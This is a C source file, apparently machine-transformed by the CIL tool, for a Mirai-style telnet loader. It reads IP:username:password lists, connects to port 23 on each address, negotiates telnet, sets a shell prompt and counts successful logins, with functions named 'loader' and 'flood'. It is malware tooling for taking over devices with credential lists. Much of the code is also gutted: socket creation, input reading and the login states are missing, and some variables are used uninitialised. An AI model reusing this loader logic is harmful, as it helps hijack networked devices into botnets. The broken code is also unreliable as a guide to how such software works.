/* Generated by CIL v. 1.8.2 */
/* print_CIL_Input is true */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <math.h>
#include <stdint.h>

typedef __builtin_va_list __gnuc_va_list;

typedef __gnuc_va_list va_list___0;


struct linger {
   int l_onoff ;
   int l_linger ;
};
struct sockaddr_in ;
typedef __uint8_t uint8_t;
typedef __uint16_t uint16_t;
typedef __uint32_t uint32_t;
typedef __uint64_t uint64_t;
typedef uint32_t in_addr_t;
struct in_addr {
   in_addr_t s_addr ;
};
typedef uint16_t in_port_t;
struct sockaddr_in {
   sa_family_t sin_family ;
   in_port_t sin_port ;
   struct in_addr sin_addr ;
   unsigned char sin_zero[((sizeof(struct sockaddr ) - sizeof(unsigned short )) - sizeof(in_port_t )) - sizeof(struct in_addr )] ;
};

struct stateSlot_t {
   int slotUsed ;
   pthread_mutex_t mutex ;
   unsigned char success ;
   unsigned char is_open ;
   unsigned char special ;
   unsigned char got_prompt ;
   uint8_t pathInd ;
   uint16_t echoInd ;
   int complete ;
   uint32_t ip ;
   int fd ;
   int updatedAt ;
   int reconnecting ;
   unsigned char state ;
   char path[5][32] ;
   char username[32] ;
   char password[32] ;
};
struct __anonstruct_binary_838077917 {
   int num_slices ;
   unsigned char **slices ;
};
static char *bind_ip  =    (char *)"0.0.0.0";
static unsigned char debug_mode  =    (unsigned char)0;
static int maxConnectedSockets  =    0;
int volatile   running_threads  =    (int volatile   )0;
unsigned long volatile   found_srvs  =    (unsigned long volatile   )0;
unsigned int volatile   bytes_sent  =    (unsigned int volatile   )0;
unsigned long volatile   timed_out  =    (unsigned long volatile   )0;
unsigned long volatile   login_done  =    (unsigned long volatile   )0;
unsigned long volatile   failed_connect  =    (unsigned long volatile   )0;
unsigned long volatile   remote_hangup  =    (unsigned long volatile   )0;
unsigned short volatile   port  =    (unsigned short volatile   )0;
unsigned int volatile   maxFDSaw  =    (unsigned int volatile   )0;
FILE *infd  ;
char *run_arg  =    (char *)((void *)0);
static int epollFD  ;
struct __anonstruct_binary_838077917 binary  ;
struct stateSlot_t stateTable[1]  = {      {0, {{0, 0U, 0, 0U, 0, (short)0, (short)0, {(struct __pthread_internal_list *)0,
                                                 (struct __pthread_internal_list *)0}}},
      (unsigned char)0, (unsigned char)0, (unsigned char)0, (unsigned char)0, (unsigned char)0,
      (unsigned short)0, 0, 0U, 0, 0, 0, (unsigned char)0, {{(char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0}, {(char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0},
                                                            {(char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0}, {(char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0},
                                                            {(char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0}}, {(char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0},
      {(char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0,
       (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0,
       (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0,
       (char)0, (char)0, (char)0, (char)0, (char)0}}};

int log_recv(int sock , void *buf , int len , int flags )
{
  int ret ;
  ssize_t tmp ;
  int i ;
  char hex_buf[32] ;
  unsigned int tmp___0 ;

  {
  memset(buf, 0, (size_t )len);
  tmp = recv(sock, buf, (size_t )len, flags);
  ret = (int )tmp;
  if (ret > 0) {
    i = 0;
    i = 0;
    while (i < ret) {
      if ((int )*((char *)buf + i) == 0) {
        *((char *)buf + i) = (char )'A';
      }
      i ++;
    }
  }
  if (debug_mode) {
    hex_buf[0] = (char)0;
    tmp___0 = 1U;
    while (! (tmp___0 >= 32U)) {
      hex_buf[tmp___0] = (char)0;
      tmp___0 ++;
    }
    sprintf((char * __restrict  )(hex_buf), (char const   * __restrict  )"state %d - recv: %d",
            (int )stateTable[sock].state, ret);
    if (ret != -1) {

    } else {
      printf((char const   * __restrict  )"%s\n", hex_buf);
    }
  }
  return (ret);
}
}
int log_send(int sock , void *buf , int len , int flags )
{
  char hex_buf[32] ;
  unsigned int tmp ;
  ssize_t tmp___0 ;

  {
  if (debug_mode) {
    hex_buf[0] = (char)0;
    tmp = 1U;
    while (! (tmp >= 32U)) {
      hex_buf[tmp] = (char)0;
      tmp ++;
    }
    sprintf((char * __restrict  )(hex_buf), (char const   * __restrict  )"state %d - send: %d",
            (int )stateTable[sock].state, len);
  }
  bytes_sent += (unsigned int volatile   )len;
  tmp___0 = send(sock, (void const   *)buf, (size_t )len, flags);
  return ((int )tmp___0);
}
}
int sockprintf(int sock , char *formatStr  , ...)
{
  char textBuffer[2048] ;
  unsigned int tmp ;
  va_list___0 args ;
  int q ;
  size_t tmp___0 ;
  int tmp___1 ;

  {
  textBuffer[0] = (char)0;
  tmp = 1U;
  while (! (tmp >= 2048U)) {
    textBuffer[tmp] = (char)0;
    tmp ++;
  }
  memset((void *)(textBuffer), 0, (size_t )2048);
  __builtin_va_start(args, formatStr);
  vsprintf((char * __restrict  )(textBuffer), (char const   * __restrict  )formatStr,
           args);
  __builtin_va_end(args);
  tmp___0 = strlen((char const   *)(textBuffer));
  tmp___1 = log_send(sock, (void *)(textBuffer), (int )tmp___0, 16384);
  q = tmp___1;
  return (q);
}
}
 __attribute__((__nothrow__)) void *( __attribute__((__nonnull__(1,3))) memmem)(void const   *l ,
                                                                                unsigned long l_len ,
                                                                                void const   *s ,
                                                                                unsigned long s_len )  __attribute__((__pure__)) ;

void handle_remote_closed(int fd )
{


  {
  remote_hangup += (unsigned long volatile   )1;
  return;
}
}
void handle_timeout(int fd )
{


  {
  timed_out += (unsigned long volatile   )1;
  return;
}
}
void handle_failed_connect(int fd )
{


  {
  failed_connect += (unsigned long volatile   )1;
  return;
}
}
void handle_found(int fd )
{


  {
  found_srvs += (unsigned long volatile   )1;
  return;
}
}
void closeAndCleanup(int fd )
{
  struct linger linger ;

  {
  if (stateTable[fd].slotUsed) {
    if (stateTable[fd].fd == fd) {
      stateTable[fd].slotUsed = 0;
      stateTable[fd].state = (unsigned char)0;
      stateTable[fd].path[0][0] = (char)0;
      stateTable[fd].path[1][0] = (char)0;
      stateTable[fd].path[2][0] = (char)0;
      stateTable[fd].path[3][0] = (char)0;
      stateTable[fd].path[4][0] = (char)0;
      stateTable[fd].username[0] = (char)0;
      stateTable[fd].password[0] = (char)0;
      stateTable[fd].echoInd = (uint16_t )0;
      stateTable[fd].pathInd = (uint8_t )0;
      stateTable[fd].success = (unsigned char)0;
      stateTable[fd].special = (unsigned char)0;
      stateTable[fd].got_prompt = (unsigned char)0;
      if (stateTable[fd].is_open) {
        stateTable[fd].is_open = (unsigned char)0;
        shutdown(fd, 2);
        linger.l_onoff = 1;
        linger.l_linger = 0;
        setsockopt(fd, 1, 13, (void const   *)((char *)(& linger)), (socklen_t )sizeof(linger));
        close(fd);
      }
    }
  }
  return;
}
}

void *flood(void *par1 )
{
  unsigned char buf[10241] ;
  unsigned int tmp ;
  struct epoll_event pevents[25] ;
  unsigned int tmp___0 ;
  int ret ;
  int i ;
  int got ;
  int ii ;
  struct stateSlot_t *state ;
  int is_closed ;
  struct stateSlot_t *state___0 ;
  int old_state ;
  unsigned char tmp1[3] ;
  unsigned char tmp2[9] ;
  void *tmp___1 ;
  void *tmp___2 ;
  void *tmp___3 ;
  void *tmp___4 ;
  int tmp___5 ;
  void *tmp___6 ;
  int tmp___7 ;
  char *tmp___8 ;
  char *tmp___9 ;
  char *tmp___10 ;
  char *tmp___11 ;
  char *tmp___12 ;
  int tmp___13 ;
  int tmp___14 ;
  char *tmp___15 ;
  int tmp___16 ;
  char *tmp_buf ;
  char *start ;
  char *space ;
  int memes ;
  char *tmp___18 ;
  char *tmp___19 ;
  char *tmp___20 ;
  int iii ;
  char *tmp___21 ;
  char *tmp___22 ;
  size_t tmp___23 ;
  int tmp___24 ;
  char *tmp___25 ;
  char *tmp___26 ;
  size_t tmp___27 ;
  int tmp___28 ;
  char *tmp___29 ;
  uint16_t tmp___30 ;
  char *tmp___31 ;
  char *tmp___32 ;
  char *tmp___33 ;
  int tmp___34 ;
  void *tmp___35 ;
  int tmp___36 ;
  struct epoll_event event ;
  struct stateSlot_t *state___1 ;
  int so_error ;
  socklen_t len ;
  int *tmp___37 ;

  {
  __sync_fetch_and_add(& running_threads, 1);
  buf[0] = (unsigned char)0;
  tmp = 1U;
  while (! (tmp >= 10241U)) {
    buf[tmp] = (unsigned char)0;
    tmp ++;
  }
  pevents[0].events = (uint32_t )0;
  pevents[0].data.ptr = (void *)0;
  tmp___0 = 1U;
  while (! (tmp___0 >= 25U)) {
    pevents[tmp___0].events = 0U;
    pevents[tmp___0].data.ptr = (void *)0;
    tmp___0 ++;
  }
  ret = 0;
  i = 0;
  got = 0;
  ii = 0;
  while (1) {
    ret = epoll_wait(epollFD, pevents, 25, 10000);
    if (! (ret >= 0)) {
      if (ret == -1) {
        tmp___37 = __errno_location();
        if (! (*tmp___37 == 4)) {
          break;
        }
      } else {
        break;
      }
    }
    if (ret == 0) {
      continue;
    }
    i = 0;
    while (i < ret) {
      if (pevents[i].events & 8U) {
        goto _L___0;
      } else
      if (pevents[i].events & 16U) {
        goto _L___0;
      } else
      if (pevents[i].events & 8192U) {
        goto _L___0;
      } else
      if (! (pevents[i].events & 1U)) {
        if (! (pevents[i].events & 4U)) {
          _L___0: /* CIL Label */
          state = & stateTable[pevents[i].data.fd];
          if ((int )state->state == 0) {
            handle_failed_connect(state->fd);
          } else {
            handle_remote_closed(state->fd);
          }
          pthread_mutex_lock(& state->mutex);
          closeAndCleanup(state->fd);
          pthread_mutex_unlock(& state->mutex);
        } else {
          goto _L___1;
        }
      } else
      _L___1: /* CIL Label */
      if (pevents[i].events & 1U) {
        is_closed = 0;
        state___0 = & stateTable[pevents[i].data.fd];
        memset((void *)(buf), 0, (size_t )10241);
        pthread_mutex_lock(& state___0->mutex);
        old_state = (int )state___0->state;
        got = 0;
        while (1) {
          if ((int )state___0->state == 1) {
            got = log_recv(state___0->fd, (void *)(buf), 1, 2);
            if (got > 0) {
              if ((int )buf[0] == 255) {
                state___0->state = (unsigned char)2;
              }
            }
            if (got > 0) {
              if ((int )buf[0] != 255) {
                state___0->state = (unsigned char)3;
              }
            }
          }
          if ((int )state___0->state == 2) {
            log_recv(state___0->fd, (void *)(buf), 1, 0);
            got = log_recv(state___0->fd, (void *)(buf + 1), 2, 0);
            
          }
          __Cont: /* CIL Label */
          if (got > 0) {
            if (! ((int )state___0->state != 3)) {
              break;
            }
          } else {
            break;
          }
        }

        if ((int )state___0->state == 251) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___35 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000",
                              16UL);
            if ((unsigned long )tmp___35 != (unsigned long )((void *)0)) {
              sockprintf(state___0->fd, (char *)"export PS1=\"prompt>\"\r\n");
              state___0->state = (unsigned char)8;
              break;
            } else {

              if (tmp___36) {
                sockprintf(state___0->fd, (char *)"export PS1=\"prompt>\"\r\n");
                state___0->state = (unsigned char)8;
                break;
              }
            }
          }
        }
        if ((int )state___0->state == 254) {
          closeAndCleanup(state___0->fd);
          is_closed = 1;
        }
        if ((int )state___0->state == 255) {
          if (state___0->success) {
            handle_found(state___0->fd);
          }
          closeAndCleanup(state___0->fd);
          is_closed = 1;
        }
        
        pthread_mutex_unlock(& state___0->mutex);
        if (! is_closed) {
          event.events = (uint32_t )0;
          event.data.ptr = (void *)0;
          event.data.fd = state___0->fd;
          event.events = 3221233665U;
          epoll_ctl(epollFD, 3, state___0->fd, & event);
        }
      } else
      if (pevents[i].events & 4U) {
        state___1 = & stateTable[pevents[i].data.fd];
        pthread_mutex_lock(& state___1->mutex);
        if ((int )state___1->state == 0) {
          so_error = 0;
          len = (socklen_t )sizeof(so_error);
          getsockopt(state___1->fd, 1, 4, (void * __restrict  )(& so_error), (socklen_t * __restrict  )(& len));
          if (so_error) {
            handle_failed_connect(state___1->fd);
            closeAndCleanup(state___1->fd);
            pthread_mutex_unlock(& state___1->mutex);
            goto __Cont___1;
          }
          state___1->state = (unsigned char)1;
          pevents[i].events = 3221233665U;
          epoll_ctl(epollFD, 3, state___1->fd, & pevents[i]);
        } else {
          printf((char const   * __restrict  )"wrong state on connect epoll: %d\n",
                 state___1->fd);
          closeAndCleanup(state___1->fd);
        }
        pthread_mutex_unlock(& state___1->mutex);
      }
      __Cont___1: /* CIL Label */
      i ++;
    }
  }
  __sync_fetch_and_sub(& running_threads, 1);
  return ((void *)0);
}
}

void *loader(void *threadCount )
{
  char readmelolfgt[1024] ;
  char *pch ;
  char *running ;
  char *orig ;
  char *token ;
  int curTime ;
  time_t tmp ;
  int q ;
  int tmp___0 ;
  in_addr_t tmp___1 ;
  struct sockaddr_in dest_addr ;
  int fd ;
  struct sockaddr_in my_addr ;
  int *tmp___2 ;
  int tmp___3 ;
  int flag ;
  unsigned short volatile   tmp___4 ;
  int *tmp___5 ;
  int tmp___6 ;
  int res ;
  int *tmp___7 ;
  time_t tmp___8 ;
  struct epoll_event event ;
  char *tmp___9 ;
  int curTime___0 ;
  time_t tmp___10 ;
  int q___0 ;

  {
  memset((void *)(readmelolfgt), 0, (size_t )1024);
  pch = (char *)((void *)0);
  while (1) {

    if (! ((unsigned long )tmp___9 != (unsigned long )((void *)0))) {
      break;
    }
    while (1) {
      tmp___0 = 0;
      if (! (tmp___0 > maxConnectedSockets - 1)) {
        break;
      }
      tmp = time((time_t *)((void *)0));
      curTime = (int )tmp;
      q = 0;
      while ((unsigned int volatile   )q < maxFDSaw) {
        pthread_mutex_lock(& stateTable[q].mutex);
        if (stateTable[q].slotUsed) {
          if (curTime > stateTable[q].updatedAt + 60) {
            if (stateTable[q].reconnecting == 0) {
              if ((int )stateTable[q].state == 0) {
                handle_failed_connect(stateTable[q].fd);
              } else {
                handle_timeout(stateTable[q].fd);
              }
              closeAndCleanup(stateTable[q].fd);
            }
          }
        }
        pthread_mutex_unlock(& stateTable[q].mutex);
        q ++;
      }
      usleep((__useconds_t )1000000);
    }
    orig = strdup((char const   *)(readmelolfgt));
    running = orig;
    token = strsep((char ** __restrict  )(& running), (char const   * __restrict  )":");
    if ((unsigned long )token == (unsigned long )((void *)0)) {
      free((void *)orig);
      continue;
    } else {
      tmp___1 = inet_addr((char const   *)token);
      if (tmp___1 == 4294967295U) {
        free((void *)orig);
        continue;
      }
    }
    memset((void *)(& dest_addr), 0, sizeof(struct sockaddr_in ));
    dest_addr.sin_family = (sa_family_t )2;
    dest_addr.sin_port = htons((uint16_t )23);
    dest_addr.sin_addr.s_addr = inet_addr((char const   *)token);
    fd = 0;

    printf((char const   * __restrict  )"bound\n");
    res = 0;
    res = connect(fd, (struct sockaddr  const  * __restrict  )((struct sockaddr *)(& dest_addr)),
                  (socklen_t )sizeof(dest_addr));
    if (res < 0) {
      tmp___7 = __errno_location();
      if (*tmp___7 != 115) {
        close(fd);
        continue;
      }
    }
    pthread_mutex_lock(& stateTable[fd].mutex);
    if (! stateTable[fd].slotUsed) {
      printf((char const   * __restrict  )"memes\n");
      stateTable[fd].fd = fd;
      tmp___8 = time((time_t *)((void *)0));
      stateTable[fd].updatedAt = (int )tmp___8;
      stateTable[fd].slotUsed = 1;
      stateTable[fd].state = (unsigned char)0;
      stateTable[fd].is_open = (unsigned char)1;
      stateTable[fd].special = (unsigned char)0;
      token = strsep((char ** __restrict  )(& running), (char const   * __restrict  )":");
      strcpy((char * __restrict  )(stateTable[fd].username), (char const   * __restrict  )token);
      token = strsep((char ** __restrict  )(& running), (char const   * __restrict  )":");
      strcpy((char * __restrict  )(stateTable[fd].password), (char const   * __restrict  )token);
    } else {
      printf((char const   * __restrict  )"used slot found in loader thread?\n");
    }
    pthread_mutex_unlock(& stateTable[fd].mutex);
    event.events = (uint32_t )0;
    event.data.ptr = (void *)0;
    event.data.fd = fd;
    event.events = 3221233668U;
    epoll_ctl(epollFD, 1, fd, & event);
    free((void *)orig);
  }
  printf((char const   * __restrict  )"done reading input file.\n");
  while (1) {
    tmp___10 = time((time_t *)((void *)0));
    curTime___0 = (int )tmp___10;
    q___0 = 0;
    while ((unsigned int volatile   )q___0 < maxFDSaw) {
      pthread_mutex_lock(& stateTable[q___0].mutex);
      if (stateTable[q___0].slotUsed) {
        if (curTime___0 > stateTable[q___0].updatedAt + 60) {
          if (stateTable[q___0].reconnecting == 0) {
            if ((int )stateTable[q___0].state == 0) {
              handle_failed_connect(stateTable[q___0].fd);
            } else {
              handle_timeout(stateTable[q___0].fd);
            }
            closeAndCleanup(stateTable[q___0].fd);
          }
        }
      }
      pthread_mutex_unlock(& stateTable[q___0].mutex);
      q___0 ++;
    }
    sleep(1U);
  }
}
}

int main(int argc , char **argv )
{
  int threads ;
  int tmp ;
  int i ;
  pthread_t thread ;
  char timeText[100] ;
  time_t now ;
  time_t tmp___0 ;
  struct tm *t ;
  struct tm *tmp___1 ;
  char temp[17] ;
  unsigned int tmp___2 ;
  char *new ;
  void *tmp___3 ;
  int tmp___4 ;
  int tmp___5 ;

  {

  signal(13, (void (*)(int  ))1);
  epollFD = epoll_create(57005);
  bind_ip = *(argv + 1);
  infd = fopen((char const   * __restrict  )*(argv + 2), (char const   * __restrict  )"r");

  tmp = atoi((char const   *)*(argv + 5));
  threads = tmp;
  maxConnectedSockets = atoi((char const   *)*(argv + 6));
  if (argc == 8) {
    debug_mode = (unsigned char)1;
  }
  i = 0;
  while (i < 1) {
    pthread_mutex_init(& stateTable[i].mutex, (pthread_mutexattr_t const   *)((void *)0));
    i ++;
  }
  run_arg = *(argv + 4);
  pthread_create((pthread_t * __restrict  )(& thread), (pthread_attr_t const   * __restrict  )((void *)0),
                 & loader, (void * __restrict  )((void *)(& threads)));
  i = 0;
  while (i < threads) {
    pthread_create((pthread_t * __restrict  )(& thread), (pthread_attr_t const   * __restrict  )((void *)0),
                   & flood, (void * __restrict  )((void *)0));
    i ++;
  }
  tmp___0 = time((time_t *)((void *)0));
  now = tmp___0;
  tmp___1 = localtime((time_t const   *)(& now));
  t = tmp___1;
  strftime((char * __restrict  )(timeText), sizeof(timeText) - 1UL, (char const   * __restrict  )"%d %b %Y %l:%M %p %Z",
           (struct tm  const  * __restrict  )t);
  printf((char const   * __restrict  )"Starting Scan at %s\n", timeText);
  temp[0] = (char)0;
  tmp___2 = 1U;
  while (! (tmp___2 >= 17U)) {
    temp[tmp___2] = (char)0;
    tmp___2 ++;
  }

  sleep(1U);
  tmp___3 = malloc((size_t )96);
  new = (char *)tmp___3;
  while (1) {
    if (debug_mode) {
      tmp___5 = 1;
    } else {
      tmp___5 = running_threads > (int volatile   )0;
    }
    if (! tmp___5) {
      break;
    }
    printf((char const   * __restrict  )"\r");
    memset((void *)new, '\000', (size_t )96);

    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            timed_out);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            failed_connect);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            remote_hangup);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
            login_done);
    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15d", new,
            bytes_sent);
    tmp___4 = 0;

    printf((char const   * __restrict  )"%s", new);
    fflush(stdout);
    bytes_sent = (unsigned int volatile   )0;
    sleep(1U);
  }
  printf((char const   * __restrict  )"\n");
  now = time((time_t *)((void *)0));
  t = localtime((time_t const   *)(& now));
  strftime((char * __restrict  )(timeText), sizeof(timeText) - 1UL, (char const   * __restrict  )"%d %b %Y %l:%M %p %Z",
           (struct tm  const  * __restrict  )t);
  printf((char const   * __restrict  )"Scan finished at %s\n", timeText);
  return (0);
}
}
